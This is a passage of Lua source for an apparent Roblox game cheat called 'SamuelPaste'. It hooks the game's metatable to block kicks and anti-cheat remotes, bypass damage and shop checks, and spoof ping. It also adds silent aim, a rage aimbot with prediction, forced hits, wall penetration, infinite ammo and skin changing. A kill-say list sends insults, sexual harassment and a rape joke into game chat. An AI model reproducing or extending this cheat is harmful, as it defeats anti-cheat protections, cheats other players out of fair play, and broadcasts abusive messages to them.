	if values.misc.movement['height change'].Toggle then 
		pcall(function() LocalPlayer.Character.Humanoid.HipHeight = 2 * (values.misc.movement['height amount'].Slider/5) end)
	else 
	    pcall(function() LocalPlayer.Character.Humanoid.HipHeight = 2 end)
	end

	if values.misc.movement['no velocity'].Toggle then 
	   pcall(function() LocalPlayer.Character.HumanoidRootPart.Velocity = C.Vec3(0, LocalPlayer.Character.HumanoidRootPart.Velocity.y, 0) end)
	end

	if values.misc.movement['no gun'].Toggle then 
	   pcall(function() LocalPlayer.Character.Gun:Remove()end)
	end

	if values.misc.movement['client offset'].Toggle then 
       pcall(function() LocalPlayer.Character.LowerTorso:FindFirstChildWhichIsA('Motor6D').C0 = C.CF(0, (values.misc.movement['offset (y)'].Slider/5), 0) end)
    end

	end
end)






			local visualsilentangle = nil
			VisualizeSilentAngles = function(pos)
					visualsilentangle = RageTarget.Position
					wait(values.visuals.self["silent angle speed"].Slider/50)
					visualsilentangle = nil
			end

local mt = getrawmetatable(game) 
local oldNamecall = mt.__namecall 
local oldIndex = mt.__index 
local oldNewIndex = mt.__newindex 
local lasthittick = tick()
setreadonly(mt,false) 
mt.__namecall = function(self, ...) 
	local method = tostring(getnamecallmethod()) 
	local args = {...} 
if not PasteDisabled then
	if method == "SetPrimaryPartCFrame" and self.Name == "Arms" then 
		if values.visuals.self["third person"].Toggle and values.visuals.self["third person"].Active and LocalPlayer.Character then 
			args[1] = args[1] * C.CF(99, 99, 99) 
		else 
			if values.visuals.self["viewmodel changer"].Toggle then 
				args[1] = args[1] * ViewmodelOffset
			end 
			if values.visuals.self["visualize silent angle"].Toggle and visualsilentangle then
				args[1] = CFrame.lookAt(args[1].p, visualsilentangle)
			end 
		end
	end
	if method == "SetPrimaryPartCFrame" and self.Name ~= "Arms" then 
		args[1] = args[1] + C.Vec3(0, 3, 0) 
		coroutine.wrap(function() 
			DisableAA = true 
			wait(2) 
			DisableAA = false 
		end)() 
	end 
	if method == "Kick" then 
		return 
	end 
	if method == "FireServer" then 
		if C.LEN(self.Name) == 38 then 
			return 
		elseif self.Name == "FallDamage" and C.TBLFIND(values.misc.client["damage bypass"].Jumbobox, "fall") or values.misc.movement["jump bug"].Toggle and values.misc.movement["jump bug"].Active then 
			return 
		elseif self.Name == "BURNME" and C.TBLFIND(values.misc.client["damage bypass"].Jumbobox, "fire") then 
			return 
		elseif (self.Name == "ControlTurn" and not checkcaller()) or (self.Name == "Control" and not checkcaller()) then 
			return 
		end 
		if self.Name == "UpdatePing" then
		if values.rage.fakelag['set ping'].Slider ~= 0 then
			args[1] = values.rage.fakelag['set ping'].Slider / 10
		end
		end
		if self.Name == "PlayerChatted" and values.misc.client["chat alive"].Toggle then 
			args[2] = false 
			args[3] = "Innocent" 
			args[4] = false 
			args[5] = false 
		end 
		if self.Name == "PlayerChatted" and not values.misc.chat["chat spam"].Toggle then
			for i,v in pairs(emojis) do
				if args[1]:find(i) then
					args[1] = C.GSUB(args[1], i, v)
				end
			end
		end
		if self.Name == "ReplicateCamera" and values.misc.client["anti spectate"].Toggle then 
			args[1] = CFrame.new() 
		end 
		if self.Name == "ReplicateCamera" and values.misc.client["upside down spectate"].Toggle then      
			args[1] =  args[1] * C.CFAngles(0,0,C.RAD(180))      
		end      
	end 
	if method == "FindPartOnRayWithWhitelist" and not checkcaller() and Client.gun ~= "none" and Client.gun.Name ~= "C4" then 
		if #args[2] == 1 and args[2][1].Name == "SpawnPoints" then 
			local Team = LocalPlayer.Status.Team.Value 

			if C.TBLFIND(values.misc.client.shop.Jumbobox, "anywhere") then 
				return Team == "T" and args[2][1].BuyArea or args[2][1].BuyArea2 
			end 
		end 
	end 
	if method == "FindPartOnRayWithIgnoreList" and args[2][1] == workspace.Debris then 
		if not checkcaller() or Filter then 
			if C.TBLFIND(values.misc.client["gun modifiers"].Jumbobox, "penetration") then 
				C.INSERT(args[2], workspace.Map) 
			end 
			if C.TBLFIND(values.misc.client["gun modifiers"].Jumbobox, "spread") then 
				args[1] = C.RAY(Camera.CFrame.p, Camera.CFrame.LookVector * Client.gun.Range.Value) 
			end 
			local Stats = values.legit.main.default
			if values.legit.aimbot["silent aim"].Toggle and values.legit.aimbot["silent aim"].Active and Stats["silent aim"].Toggle then 
				local Ignore = {LocalPlayer.Character, Camera, workspace.Map.Clips, workspace.Map.SpawnPoints, workspace.Debris} 
				local Closest = 9999 
				local Target 

				if not C.TBLFIND(Stats.conditions.Jumbobox, "smoke") then 
					C.INSERT(Ignore, workspace.Ray_Ignore) 
				end 

				coroutine.wrap(function() 
					if not C.TBLFIND(Stats.conditions.Jumbobox, "blind") or LocalPlayer.PlayerGui.Blnd.Blind.BackgroundTransparency > 0.9 then 
						if not C.TBLFIND(Stats.conditions.Jumbobox, "blind") or SelfVelocity.Magnitude < 3 then 
							for _,Player in pairs(Players:GetPlayers()) do 
								if Player.Character and Player.Character:FindFirstChild("Humanoid") and Player.Character:FindFirstChild("Humanoid").Health > 0 then 
									if not values.legit.settings["forcefield check"].Toggle or not Player.Character:FindFirstChildOfClass("ForceField") then 
										if Player.Team ~= LocalPlayer.Team or values.legit.settings["free for all"].Toggle then 
											local Pos, onScreen = Camera:WorldToViewportPoint(Player.Character.HumanoidRootPart.Position) 
											if onScreen then 
												local Magnitude = (C.Vec2(Pos.X, Pos.Y) - C.Vec2(Mouse.X, Mouse.Y)).Magnitude 
												if Magnitude < Stats["FOV"].Slider then 
													local Hitbox = Stats.priority.Dropdown == "head" and Player.Character.Head or Stats.priority.Dropdown == "chest" and Player.Character.UpperTorso 
													if Stats.priority.Dropdown == "closest" then 
														local HeadPos = Camera:WorldToViewportPoint(Player.Character.Head.Position) 
														local TorsoPos = Camera:WorldToViewportPoint(Player.Character.UpperTorso.Position) 
														local HeadDistance = (C.Vec2(HeadPos.X, HeadPos.Y) - C.Vec2(Mouse.X, Mouse.Y)).Magnitude 
														local TorsoDistance = (C.Vec2(TorsoPos.X, TorsoPos.Y) - C.Vec2(Mouse.X, Mouse.Y)).Magnitude 
														if HeadDistance < TorsoDistance then 
															Hitbox = Player.Character.Head 
														else 
															Hitbox = Player.Character.UpperTorso 
														end 
													end 
													if Hitbox ~= nil then 
														if not C.TBLFIND(Stats.conditions.Jumbobox, "visible") then 
															Target = Hitbox 
														else 
															local Ray1 = C.RAY(Camera.CFrame.Position, (Hitbox.Position - Camera.CFrame.Position).unit * (Hitbox.Position - Camera.CFrame.Position).magnitude) 
															local Hit, Pos = workspace:FindPartOnRayWithIgnoreList(Ray1, Ignore, false, true) 
															if Hit and Hit:FindFirstAncestor(Player.Name) then 
																Target = Hitbox 
															end 
														end 
													end 
												end 
											end 
										end 
									end 
								end 
							end 
						end 
					end 

					local Hit = C.RANDOM(1, 100) <= Stats.hitchance.Slider 
					if Target ~= nil and Hit then 
						args[1] = C.RAY(Camera.CFrame.Position, (Target.Position - Camera.CFrame.Position).unit * (Target.Position - Camera.CFrame.Position).magnitude) 
					end 
				end)() 
			end 
			if RageTarget ~= nil then 
				local Origin = values.rage.aimbot.origin.Dropdown == "character" and LocalPlayer.Character.LowerTorso.Position + C.Vec3(0, 2.5, 0) or Camera.CFrame.p 
				if values.rage.aimbot["delay shot"].Toggle then 
					spawn(function() 
						args[1] = C.RAY(Origin, (RageTarget.Position - Origin).unit * (RageTarget.Position - Origin).magnitude) 
					end) 
				else 
					args[1] = C.RAY(Origin, (RageTarget.Position - Origin).unit * (RageTarget.Position - Origin).magnitude) 
				end 
				--[[if values.rage.aimbot["front track"].Toggle and RageTarget:IsDescendantOf(fowardtrackFolder) then
				RageTarget = game.Players[RageTarget.Parent.Name].Character[RageTarget.Name]
				end--]]
			end 
		end 
	end 
	if method == "InvokeServer" then 
		if self.Name == "Moolah" then 
			return 
		elseif self.Name == "Hugh" then 
			return 
		elseif self.Name == "Filter" and values.misc.chat["no filter"].Toggle then 
			return args[1] 
		end 
	end 
	if method == "LoadAnimation" and self.Name == "Humanoid" then
		if values.rage.others["leg movement"].Dropdown == "slide 1" then
            if C.FIND(args[1].Name, "Walk") or C.FIND(args[1].Name, "Run") then
                args[1] = FakeAnim
            end
		elseif values.rage.others["leg movement"].Dropdown == "slide 2" then
			if C.FIND(args[1].Name, "Walk") or C.FIND(args[1].Name, "Run") or C.FIND(args[1].Name, "Jump") then
				args[1] = FakeAnim
            end
        elseif values.rage.others["leg movement"].Dropdown == "no jump anim" then
			if C.FIND(args[1].Name, "Jump") then
				args[1] = FakeAnim
			end
		end
		if values.rage.others["no animations"].Toggle then 
			args[1] = FakeAnim 
		end 
	end 
	if method == "FireServer" and self.Name == "HitPart" then 
		if values.rage.aimbot["force hit"].Toggle then 
			args[1] = RageTarget 
			args[2] = RageTarget.Position 
		end
		if values.rage.aimbot["prediction"].Dropdown ~= "off" and RageTarget ~= nil then
			coroutine.wrap(function()
				if Players:GetPlayerFromCharacter(args[1].Parent) or args[1] == RageTarget then
					local Ping = game.Stats.PerformanceStats.Ping:GetValue()
					if values.rage.aimbot["prediction"].Dropdown == "automatic" then
						local hrp = RageTarget.Parent.HumanoidRootPart.Position
						local oldHrp = RageTarget.Parent.HumanoidRootPart.OldPosition.Value
		
						local vel = (C.Vec3(hrp.X, 0, hrp.Z) - C.Vec3(oldHrp.X, 0, oldHrp.Z)) / LastStep
						local dir = C.Vec3(vel.X / vel.magnitude, 0, vel.Z / vel.magnitude)
		
							
						args[2] = args[2] + dir * (Ping / (C.POW(Ping, (1.5 * (values.rage.aimbot["automatic multiplier"].Slider / 5)))) * (dir / (dir / 2)))
						args[4] = 0
						args[12] = args[12] - (500 * (values.rage.aimbot["automatic multiplier2"].Slider / 5))
					elseif values.rage.aimbot["prediction"].Dropdown == "cframe" then
						local Velocity = (RageTarget.Parent.HumanoidRootPart.Position - RageTarget.Parent.HumanoidRootPart.OldPosition.Value)/LastStep
						local Direction = C.Vec3(Velocity.X/Velocity.magnitude, 0, Velocity.Z/Velocity.magnitude)
						args[2] = args[2] + Direction * ((Velocity.magnitude*(Ping/1000)))
						args[4] = 0
						args[12] = args[12] - 500
					else
						local Velocity = RageTarget.Parent.HumanoidRootPart.Velocity
						local Direction = C.Vec3(Velocity.X/Velocity.magnitude, 0, Velocity.Z/Velocity.magnitude)
						if Velocity.magnitude >= 8 then
							args[2] = args[2] + Direction * (Velocity.magnitude*(Ping/1000) * (Ping > 200 and 1.5 or 2))
							args[4] = 0
							args[12] = args[12] - 500
						end
					end
				end
			end)()
		end
		spawn(function()
			if values.rage['Quick peeks']['peek method'].Dropdown == 'teleport' then 
				if workspace:FindFirstChild('FreezeCharacter') then
					LocalPlayer.Character.PrimaryPart.CFrame = workspace.FreezeCharacter.no.CFrame+C.Vec3(0, 3, 0)
				end
			end
			if values.rage['Quick peeks']['peek method'].Dropdown == 'tween' then 
				if workspace:FindFirstChild('FreezeCharacter') then
					function Tween(Target,Prop,Value,tweeninfo1,tweeninfo2,tweeninfo3)
						local Tween = game:GetService("TweenService"):Create(Target,TweenInfo.new(tweeninfo1,tweeninfo2,tweeninfo3), {[Prop] = Value})
						Tween:Play() 
					end

					Tween(LocalPlayer.Character.PrimaryPart, 'CFrame', C.CF(workspace.FreezeCharacter.no.CFrame.x, LocalPlayer.Character.PrimaryPart.CFrame.y, workspace.FreezeCharacter.no.CFrame.z), 1/values.rage.exploits['tween speed'].Slider,0 ,0)
				end
			end
		end)		  
		if values.visuals.world["impacts"].Toggle then 
			coroutine.wrap(function() 
				local hit = C.INST("Part") 
				hit.Transparency = 1 
				hit.Anchored = true 
				hit.CanCollide = false 
				hit.Size = C.Vec3(0.3,0.3,0.3) 
				hit.Position = args[2] 
				local selection = C.INST("SelectionBox") 
				selection.LineThickness = 0 
				selection.SurfaceTransparency = 0.5 
				selection.Color3 = values.visuals.world["impacts"].Color 
				selection.SurfaceColor3 = values.visuals.world["impacts"].Color 
				selection.Parent = hit 
				selection.Adornee = hit 
				hit.Parent = workspace.Debris 
				wait(5.9) 
				library:Tween(selection, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {SurfaceTransparency = 1}) 
				hit:Destroy()
			end)() 
			if values.visuals.world["hit chams"].Toggle then 
				coroutine.wrap(function() 
					if Players:GetPlayerFromCharacter(args[1].Parent) and Players:GetPlayerFromCharacter(args[1].Parent).Team ~= LocalPlayer.Team then 
						for _,hitbox in pairs(args[1].Parent:GetChildren()) do 
							if hitbox:IsA("BasePart") or hitbox.Name == "Head" then 
								coroutine.wrap(function() 
									local part = C.INST("Part") 
									part.CFrame = hitbox.CFrame 
									part.Anchored = true 
									part.CanCollide = false 
									part.Material = Enum.Material.ForceField 
									part.Color = values.visuals.world["hit chams"].Color 
									part.Size = hitbox.Size 
									part.Parent = workspace.Debris 
									library:Tween(part, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Transparency = 1}) 
									wait(2) 
									part:Destroy() 
								end)() 
							end 
						end 
					end 
				end)() 
			end 
		end 
		if args[1].Parent.Parent == backtrackfolder then 
			if args[1].Parent.PlayerName.Value.Character then
				if args[1].Parent.PlayerName.Value.Character[args[1]] ~= nil then
					args[1] = args[1].Parent.PlayerName.Value.Character[args[1]]
				end
			end
		end
		--[[
		1. args[1] is a part
		2. args[1] contains in a model
		3. args[1].Parent is a model that contains playerName value
		--]]
		--[[if values.rage.aimbot["front track"].Toggle and args[1]:IsDescendantOf(fowardtrackFolder) then
				args[1] = game.Players[args[1].Parent.Name].Character[args[1].Name]
				args[2] = args[1].Position
		end--]]
	end 
		if method == "FireServer" and self.Name == "HitPart" and tick() - lasthittick > 0.005 then
			lasthittick = tick()
			spawn(function()
				if values.visuals.world["bullet tracers"].Toggle then
					local Beam = createbullettracer(LocalPlayer.Character.UpperTorso.Position, args[2])	
				end
				if (Players:GetPlayerFromCharacter(args[1].Parent) and values.misc.client.hitlogs.Toggle) or (args[1] == RageTarget and values.misc.client.hitlogs.Toggle) then --(values.rage.exploits['kill all'].Toggle ~= true) and (values.rage.exploits['hexagon kill all'].Toggle ~= true)
					hitlogs:Fire(" Hit "..args[1].Parent.Name.." in the "..args[1].Name.."  ",values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 280, 0, 22)
				end
			end)
		end
	end
	return oldNamecall(self, unpack(args)) 
end 	
		local oldIndex
		oldIndex = hookmetamethod(game,"__index",function(self, key)      
			local CallingScript = getcallingscript()      
	if not PasteDisabled then
			if not checkcaller() and self == Viewmodels and LocalPlayer.Character ~= nil and LocalPlayer.Character:FindFirstChild("UpperTorso") then      
				local WeaponName = C.GSUB(key, "v_", "")      
				if not C.FIND(WeaponName, "Arms") then      
					if Weapons[WeaponName]:FindFirstChild("Melee") and values.skins.knife["knife changer"].Toggle then      
						if Viewmodels:FindFirstChild("v_"..values.skins.knife.model.Scroll) then
							return Viewmodels:FindFirstChild("v_"..values.skins.knife.model.Scroll)      
						else      
							local Clone = Models.Knives[values.skins.knife.model.Scroll]:Clone()    
							--[[if values.skins.knife.effects.Dropdown ~= 'none' and values.skins.knife['Knife effects'].Toggle then
								for i,v in pairs(Effects[values.skins.knife.effects.Dropdown]:GetChildren()) do
									for i2,v2 in pairs(LocalPlayer.Character.Gun:GetChildren()) do if v2:IsA('Attachment') and v2.Name ~= values.skins.knife.effects.Dropdown then v2:Destroy() end end
									local lmfao = v:Clone()
									lmfao.Parent = Clone.Handle
									lmfao.Name = values.skins.knife.effects.Dropdown
								end	
							end	--]]	
							spawn(function()
								if values.skins.knife.effects.Dropdown ~= 'none' and values.skins.knife['Knife effects'].Toggle then 
									pcall(function()
										for uU,uV in pairs(game.workspace.CurrentCamera.Arms:GetChildren()) do 
											if uV.Name=="Handle" then 
												for uW,uX in pairs(Effects:GetChildren()) do 
													if uX.Name==values.skins.knife.effects.Dropdown then 
														for uY,uZ in pairs(uX:GetChildren()) do 
															if Weapons[WeaponName]:FindFirstChild("Melee") then 
																local u_=uZ:Clone()
																u_.Parent=uV 
																if values.skins.knife['Change pos (very confused better dont use)'].Toggle then
																u_.Position = Vector3.new(values.skins.knife.X.Slider, values.skins.knife.Y.Slider, values.skins.knife.Z.Slider)
																end
															end 
														end 
													end 
												end 
											end 
										end 
									end)
								end 
							end)							
							return Clone      
						end      
					end      
				end      
			end      
			if key == "Value" then      
				if self.Name == "Auto" and C.TBLFIND(values.misc.client["gun modifiers"].Jumbobox, "automatic") then      
					return true      
				elseif self.Name == "ReloadTime" and C.TBLFIND(values.misc.client["gun modifiers"].Jumbobox, "reload") then      
					return 0.001      
				elseif self.Name == "EquipTime" and C.TBLFIND(values.misc.client["gun modifiers"].Jumbobox, "equip") then      
					return 0.001      
				elseif self.Name == "BuyTime" and C.TBLFIND(values.misc.client.shop.Jumbobox, "inf time") then      
					return 5      
				end      
			end      
	end
			return oldIndex(self, key)      
		end)      
				  
--[[				  local noclip = true
				  --insert here local hook stuff
				  
mt.__newindex = function(self, i, v)
	if self.Parent == LocalPlayer.Character and i == 'CanCollide' and not checkcaller() then
		if noclip then
			v = false
		end
	end
	return oldNewIndex(self, i, v) 
end --]]
mt.__newindex = function(self, i, v) 
	if self:IsA("Humanoid") and i == "JumpPower" and not checkcaller() then 
		if values.misc.movement["jump bug"].Toggle and values.misc.movement["jump bug"].Active then 
			v = 24 
		end 
		if values.misc.movement["edge bug"].Toggle and values.misc.movement["edge bug"].Active then 
			v = 0 
		end 
	elseif self:IsA("Humanoid") and i == "CameraOffset" then 
		if values.rage.angles.enabled.Toggle and values.rage.angles["body roll"].Dropdown == "180" and not DisableAA then 
			v = v + C.Vec3(0, -3.5, 0) 
		end 
	end 

	return oldNewIndex(self, i, v) 
end 
PlayerGui.GUI.Crosshairs.Scope:GetPropertyChangedSignal("Visible"):Connect(function(current) 
	if not C.TBLFIND(values.visuals.effects.removals.Jumbobox, "scope lines") then return end 

	if current ~= false then 
		PlayerGui.GUI.Crosshairs.Scope.Visible = false 
	end 
end) 
PlayerGui.GUI.Crosshairs.Crosshair:GetPropertyChangedSignal("Visible"):Connect(function(current) 
	if not LocalPlayer.Character then return end 
	if not values.visuals.effects["force crosshair"].Toggle then return end 
	if LocalPlayer.Character:FindFirstChild("AIMING") then return end 

	PlayerGui.GUI.Crosshairs.Crosshair.Visible = true 
end) 

LocalPlayer.Additionals.TotalDamage:GetPropertyChangedSignal("Value"):Connect(function(current) 
	if current == 0  then return end

	if not current == 0 then
	coroutine.wrap(function() 
		if values.misc.client.hitmarker.Toggle then 
			local Line = Drawing.new("Line") 
			local Line2 = Drawing.new("Line") 
			local Line3 = Drawing.new("Line") 
			local Line4 = Drawing.new("Line") 

			local x, y = Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2 

			Line.From = C.Vec2(x + 4, y + 4) 
			Line.To = C.Vec2(x + 10, y + 10) 
			Line.Color = values.misc.client.hitmarker.Color 
			Line.Visible = true 

			Line2.From = C.Vec2(x + 4, y - 4) 
			Line2.To = C.Vec2(x + 10, y - 10) 
			Line2.Color = values.misc.client.hitmarker.Color 
			Line2.Visible = true 

			Line3.From = C.Vec2(x - 4, y - 4) 
			Line3.To = C.Vec2(x - 10, y - 10) 
			Line3.Color = values.misc.client.hitmarker.Color 
			Line3.Visible = true 

			Line4.From = C.Vec2(x - 4, y + 4) 
			Line4.To = C.Vec2(x - 10, y + 10) 
			Line4.Color = values.misc.client.hitmarker.Color 
			Line4.Visible = true 

			Line.Transparency = 1 
			Line2.Transparency = 1 
			Line3.Transparency = 1 
			Line4.Transparency = 1 

			Line.Thickness = 1 
			Line2.Thickness = 1 
			Line3.Thickness = 1 
			Line4.Thickness = 1 

			wait(0.3) 
			for i = 1,0,-0.1 do 
				wait() 
				Line.Transparency = i 
				Line2.Transparency = i 
				Line3.Transparency = i 
				Line4.Transparency = i 
			end 
			Line:Remove() 
			Line2:Remove() 
			Line3:Remove() 
			Line4:Remove() 
			
		end 
	end)() 
	if values.visuals.world.hitsound.Dropdown == "none" then return end 

	local sound = C.INST("Sound")      
	sound.Parent = game:GetService("SoundService")      
	sound.SoundId = values.visuals.world.hitsound.Dropdown == "skeet" and "rbxassetid://5447626464" or values.visuals.world.hitsound.Dropdown == "neverlose" and "rbxassetid://5043539486" or values.visuals.world.hitsound.Dropdown == "rust" and "rbxassetid://5043539486" or values.visuals.world.hitsound.Dropdown == "bag" and "rbxassetid://364942410" or values.visuals.world.hitsound.Dropdown == "baimware" and "rbxassetid://6607339542" or values.visuals.world.hitsound.Dropdown == "osu" and "rbxassetid://7149919358" or values.visuals.world.hitsound.Dropdown == "Tf2" and "rbxassetid://296102734" or values.visuals.world.hitsound.Dropdown == "Tf2 pan" and "rbxassetid://3431749479" or values.visuals.world.hitsound.Dropdown  == "M55solix" and "rbxassetid://364942410" or values.visuals.world.hitsound.Dropdown == "Slap" and "rbxassetid://4888372697" or values.visuals.world.hitsound.Dropdown  == "1" and "rbxassetid://7349055654" or values.visuals.world.hitsound.Dropdown == "Minecraft" and "rbxassetid://7273736372" or values.visuals.world.hitsound.Dropdown == "jojo" and "rbxassetid://6787514780" or values.visuals.world.hitsound.Dropdown == "vibe" and "rbxassetid://1848288500" or values.visuals.world.hitsound.Dropdown == "supersmash" and "rbxassetid://2039907664" or values.visuals.world.hitsound.Dropdown == "epic" and "rbxassetid://7344303740" or values.visuals.world.hitsound.Dropdown == "retro" and "rbxassetid://3466984142" or values.visuals.world.hitsound.Dropdown == "quek" and "rbxassetid://4868633804" or values.visuals.world.hitsound.Dropdown == "SEMI" and "rbxassetid://7791675603" 
	sound.Volume = values.visuals.world["sound volume"].Slider      
	sound.PlayOnRemove = true      
	sound:Destroy()  
	end
end) 
local randomkillsay = {
	"Looks like you need a better cheat!",
	"1",
	"ez",
	"Get better paste",
	"Imagine losing",
	"n1 ez media",
	"config issue",
	"cheat issue",
	"pc issue",
	"brain issue",
	"iq issue",
	"skill issue",
	"Come, let's watch the rain as it's falling down",
	"No SamuelPaste? L",
	"Seems like u died",
	"Did You die? aww",
	"Losing to SamuelPaste? Cannot be me.",
	"SamuelPaste UID?, right none",
	"You died to a bbot ui stormy aww uwu",
	"Died to Hitpart",
	"Died to Standard",
	"UID issue",
	"Pasting issue i see..",
	"When are u gonna win",
	"cant beat me with that skidded cheat?",
	"Oopsie",
	"Rawr",
	"What cheat is that Qual? ",
	"Ratted, it seems like ur mom is my gf",	
	"It looks like your face is on 'The Baddest Hvh'.",
	"Don't you love nature, despite what it did to you?",
	'h imagine dying',
	"Lost to SamuelPaste? Who woulda thought",
	"what was that? Can't hear u over my kill sound",
	"he shoots! and he misses",
	"I think im hvhing a homeless person",
	"SamuelPaste is pasted did you know?",
	"This hack is approved by invaded",
	"fun fact: this person is using SamuelPaste",
	"oww, thats gonna leave a bruise in the morning",
	"this is a tough workout!",
	"New years resolution: Keep clapping kids",
	"No way you're this bad?",
	"I just stole ur virginity",
	"Are you a chimney? Coz Im santa claus...",
	"Looks like you got coal for christmas",
	"Are you a train? Coz you're getting railed rn",
	"You and ur mom are very similar, coz both of u are getting raped"
	}
local customtypemessagesnumber = 1
LocalPlayer.Status.Kills:GetPropertyChangedSignal("Value"):Connect(function(current) 
	if current == 0 then return end 
	if values.misc.chat["kill say"].Toggle then 
		if values.misc.chat["kill say type"].Dropdown == "default" then
			ReplicatedStorage.Events.PlayerChatted:FireServer(
			values.misc.chat["message"].Text ~= "" 
			and values.misc.chat["message"].Text or "h imagine dying"
			, false, "Innocent", false, true)
		elseif values.misc.chat['kill say type'].Dropdown == 'random' then
		ReplicatedStorage.Events.PlayerChatted:FireServer(
			randomkillsay[C.RANDOM(#randomkillsay)]
		, false, "Innocent", false, true)
		else
			
			local messages = readfile('SamuelPaste/customkillsay.txt'):split('\n', '')
			if values.misc.chat['custom file type'].Dropdown == 'random' then
				ReplicatedStorage.Events.PlayerChatted:FireServer(
				messages[C.RANDOM(#messages)]
				, false, "Innocent", false, true)	
			else
				ReplicatedStorage.Events.PlayerChatted:FireServer(
				messages[customtypemessagesnumber]
				, false, "Innocent", false, true)
				customtypemessagesnumber = customtypemessagesnumber + 1
				if customtypemessagesnumber == (#messages + 1) then
				customtypemessagesnumber = 1
				end
			end
		end
	end 
end) 
--game.Players.LocalPlayer.Character:WaitForChild("Gun") 

workspace.Ray_Ignore.ChildAdded:Connect(function(obj) 
	if obj.Name == "Fires" then 
		obj.ChildAdded:Connect(function(fire) 
			if values.visuals.world["molly radius"].Toggle then 
				fire.Transparency = values.visuals.world["molly radius"].Transparency 
				fire.Color = values.visuals.world["molly radius"].Color 
			end 
		end) 
	end 
	if obj.Name == "Smokes" then 
		obj.ChildAdded:Connect(function(smoke) 
			RunService.RenderStepped:Wait() 
			local OriginalRate = C.INST("NumberValue") 
			OriginalRate.Value = smoke.ParticleEmitter.Rate 
			OriginalRate.Name = "OriginalRate" 
			OriginalRate.Parent = smoke 
			if C.TBLFIND(values.visuals.effects.removals.Jumbobox, "smokes") then 
				smoke.ParticleEmitter.Rate = 0 
			end 
			smoke.Material = Enum.Material.ForceField 
			if values.visuals.world["smoke radius"].Toggle then 
				smoke.Transparency = 0 
				smoke.Color = values.visuals.world["smoke radius"].Color 
			end 
		end) 
	end 
end) 
if workspace.Ray_Ignore:FindFirstChild("Fires") then 
	workspace.Ray_Ignore:FindFirstChild("Fires").ChildAdded:Connect(function(fire) 
		if values.visuals.world["molly radius"].Toggle then 
			fire.Transparency = values.visuals.world["molly radius"].Transparency 
			fire.Color = values.visuals.world["molly radius"].Color 
		end 
	end) 
end 
if workspace.Ray_Ignore:FindFirstChild("Smokes") then 
	for _,smoke in pairs(workspace.Ray_Ignore:FindFirstChild("Smokes"):GetChildren()) do 
		local OriginalRate = C.INST("NumberValue") 
		OriginalRate.Value = smoke.ParticleEmitter.Rate 
		OriginalRate.Name = "OriginalRate" 
		OriginalRate.Parent = smoke 
		smoke.Material = Enum.Material.ForceField 
	end 
	workspace.Ray_Ignore:FindFirstChild("Smokes").ChildAdded:Connect(function(smoke) 
		RunService.RenderStepped:Wait() 
		local OriginalRate = C.INST("NumberValue") 
		OriginalRate.Value = smoke.ParticleEmitter.Rate 
		OriginalRate.Name = "OriginalRate" 
		OriginalRate.Parent = smoke 
		if C.TBLFIND(values.visuals.effects.removals.Jumbobox, "smokes") then 
			smoke.ParticleEmitter.Rate = 0 
		end 
		smoke.Material = Enum.Material.ForceField 
		if values.visuals.world["smoke radius"].Toggle then 
			smoke.Transparency = 0 
			smoke.Color = values.visuals.world["smoke radius"].Color 
		end 
	end) 
end 
Camera.ChildAdded:Connect(function(obj)
	if C.TBLFIND(values.misc.client["gun modifiers"].Jumbobox, "ammo") then
		Client.ammocount = 999999
		Client.primarystored = 999999
		Client.ammocount2 = 999999
		Client.secondarystored = 999999
	end
	RunService.RenderStepped:Wait()
	if obj.Name ~= "Arms" then return end
	local Model
	for i,v in pairs(obj:GetChildren()) do
		if v:IsA("Model") and (v:FindFirstChild("Right Arm") or v:FindFirstChild("Left Arm")) then
			Model = v
		end
	end
	if Model == nil then return end
	for i,v in pairs(obj:GetChildren()) do
		if (v:IsA("BasePart") or v:IsA("Part")) and v.Transparency ~= 1 and v.Name ~= "Flash" then
			local valid = true
			if v:IsA("Part") and v:FindFirstChild("Mesh") and not v:IsA("BlockMesh") then
				valid = false
				local success, err = pcall(function()
					local OriginalTexture = C.INST("StringValue")
					OriginalTexture.Value = v.Mesh.TextureId
					OriginalTexture.Name = "OriginalTexture"
					OriginalTexture.Parent = v.Mesh
				end)
				local success2, err2 = pcall(function()
					local OriginalTexture = C.INST("StringValue")
					OriginalTexture.Value = v.Mesh.TextureID
					OriginalTexture.Name = "OriginalTexture"
					OriginalTexture.Parent = v.Mesh
				end)
				if success or success2 then valid = true end
			end

			for i2,v2 in pairs(v:GetChildren()) do
				if (v2:IsA("BasePart") or v2:IsA("Part")) then
					C.INSERT(WeaponObj, v2)
				end
			end

			if valid then
				C.INSERT(WeaponObj, v)
			end
		end
	end

		local gunname = Client.gun ~= 'none' and values.skins.knife['knife changer'].Toggle and Client.gun:FindFirstChild('Melee') and values.skins.knife.model.Scroll or Client.gun ~= 'none' and Client.gun.Name
	if values.skins.skins['skin changer'].Toggle and gunname ~= nil and Skins:FindFirstChild(gunname) then
		if values.skins.skins.skin.Scroll[gunname] ~= 'Inventory' then
			MapSkin(gunname, values.skins.skins.skin.Scroll[gunname])
		end
	end
	for _,v in pairs(WeaponObj) do
		if v:IsA("MeshPart") then
			local OriginalTexture = C.INST("StringValue")
			OriginalTexture.Value = v.TextureID
			OriginalTexture.Name = "OriginalTexture"
			OriginalTexture.Parent = v
		end

		local OriginalColor = C.INST("Color3Value")
		OriginalColor.Value = v.Color
		OriginalColor.Name = "OriginalColor"
		OriginalColor.Parent = v

		local OriginalMaterial = C.INST("StringValue")
		OriginalMaterial.Value = v.Material.Name
		OriginalMaterial.Name = "OriginalMaterial"
		OriginalMaterial.Parent = v

		if values.visuals.effects["weapon chams"].Toggle then
			UpdateWeapon(v)
		end
	end
	RArm = Model:FindFirstChild("Right Arm"); LArm = Model:FindFirstChild("Left Arm")
	if RArm then
		local OriginalColor = C.INST("Color3Value")
		OriginalColor.Value = RArm.Color
		OriginalColor.Name = "Color3Value"
		OriginalColor.Parent = RArm
		if values.visuals.effects["arm chams"].Toggle then
			RArm.Color = values.visuals.effects["arm chams"].Color
			RArm.Transparency = values.visuals.effects["arm chams"].Transparency
		end
		RGlove = RArm:FindFirstChild("Glove") or RArm:FindFirstChild("RGlove")
				if values.skins.glove['glove changer'].Toggle and Client.gun ~= 'none' then
			if RGlove then RGlove:Destroy() end
			RGlove = GloveModels[values.skins.glove.model.Dropdown].RGlove:Clone()
